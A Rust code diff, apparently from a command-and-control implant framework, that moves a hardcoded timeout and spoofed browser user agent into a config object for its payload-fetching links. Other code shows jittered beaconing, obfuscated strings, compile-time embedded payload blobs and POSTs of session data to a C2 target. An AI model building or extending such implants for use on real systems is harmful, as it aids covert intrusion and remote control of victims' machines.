@@ -17,10 +17,6 @@ use std::time::Duration;
 
 use crate::payload::Payload;
 
-//TODO remove this from const, and find a way to define it globally with config for every Link.
-const USER_AGENT: &str =
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0";
-const TIMEOUT: u64 = 10;
 
 #[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
 pub enum Link {
@@ -135,7 +131,7 @@ pub struct HTTPPostC2Link {
 }
 
 pub trait LinkFetch {
-    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error>;
+    fn download_data(&self,config:&Config) -> Result<Vec<u8>, anyhow::Error>;
     fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config) -> Result<Vec<u8>, anyhow::Error>;
     fn get_target(&self) -> String;
     fn get_dataoperation(&self) -> Vec<DataOperation>;
@@ -162,9 +158,9 @@ pub trait LinkFetch {
         Ok(data)
     }
 
-    fn fetch_data(&self) -> Result<Vec<u8>, anyhow::Error> {
+    fn fetch_data(&self,config:&Config) -> Result<Vec<u8>, anyhow::Error> {
         self.sleep_and_jitt();
-        let data = self.download_data()?;
+        let data = self.download_data(config)?;
         self.un_apply_all_dataoperations(data)
     }
 
@@ -182,23 +178,23 @@ pub trait LinkFetch {
 //TODO remove duplicate code : https://hoverbear.org/blog/optional-arguments/
 
 impl LinkFetch for Link {
-    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
+    fn download_data(&self,config:&Config) -> Result<Vec<u8>, anyhow::Error> {
         match &self {
-            Link::HTTP(link) => link.download_data(),
-            Link::DNS(link) => link.download_data(),
-            Link::FILE(link) => link.download_data(),
-            Link::MEMORY(link) => link.download_data(),
-            Link::HTTPPostC2(link) => link.download_data(),
+            Link::HTTP(link) => link.download_data(config),
+            Link::DNS(link) => link.download_data(config),
+            Link::FILE(link) => link.download_data(config),
+            Link::MEMORY(link) => link.download_data(config),
+            Link::HTTPPostC2(link) => link.download_data(config),
         }
     }
 
     fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config
 ) -> Result<Vec<u8>, anyhow::Error> {
         match &self {
-            Link::HTTP(link) => link.download_data(),
-            Link::DNS(link) => link.download_data(),
-            Link::FILE(link) => link.download_data(),
-            Link::MEMORY(link) => link.download_data(),
+            Link::HTTP(link) => link.download_data(config),
+            Link::DNS(link) => link.download_data(config),
+            Link::FILE(link) => link.download_data(config),
+            Link::MEMORY(link) => link.download_data(config),
             Link::HTTPPostC2(link) => link.fetch_data_with_post(session_id,running_thread,config),
         }
     }
@@ -243,7 +239,7 @@ impl LinkFetch for Link {
 }
 
 impl LinkFetch for FileLink {
-    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
+    fn download_data(&self,_config:&Config) -> Result<Vec<u8>, anyhow::Error> {
         debug!("{}{}", encrypt_string!("File Open: "), &self.get_target());
         let file_bytes: Vec<u8> = fs::read(self.get_target())?;
         Ok(file_bytes)
@@ -323,7 +319,7 @@ static MEMORY_4 : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/conf
 // ----------- COMPILE TIME mEMORy - end
 
 impl LinkFetch for MemoryLink {
-    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
+    fn download_data(&self,_config:&Config) -> Result<Vec<u8>, anyhow::Error> {
         match self.memory_nb {
             1 => Ok(MEMORY_1.to_vec()),
             2 => Ok(MEMORY_2.to_vec()),
@@ -353,7 +349,7 @@ impl LinkFetch for MemoryLink {
 }
 
 impl LinkFetch for DNSLink {
-    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
+    fn download_data(&self,_config:&Config) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
     fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>, _config:&Config
@@ -376,10 +372,10 @@ impl LinkFetch for DNSLink {
 }
 
 impl LinkFetch for HTTPLink {
-    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
+    fn download_data(&self,config:&Config) -> Result<Vec<u8>, anyhow::Error> {
         let client = reqwest::blocking::Client::builder()
-            .timeout(Duration::from_secs(TIMEOUT))
-            .user_agent(USER_AGENT)
+            .timeout(Duration::from_secs(config.link_timeout))
+            .user_agent(&config.link_user_agent)
             .build()?;
 
         let mut res = client.get(&self.get_target()).send()?;
@@ -430,7 +426,7 @@ pub struct PostToC2 {
 use std::process;
 
 impl LinkFetch for HTTPPostC2Link {
-    fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
+    fn download_data(&self,_config:&Config) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
     fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config
@@ -462,8 +458,8 @@ impl LinkFetch for HTTPPostC2Link {
         //map.insert("working-link", "todo".to_string());
 
         let client = reqwest::blocking::Client::builder()
-            .timeout(Duration::from_secs(TIMEOUT))
-            .user_agent(USER_AGENT)
+            .timeout(Duration::from_secs(config.link_timeout))
+            .user_agent(&config.link_user_agent)
             .build()?;
 
         let mut res = client.post(&self.get_target()).json(&yolo).send()?;
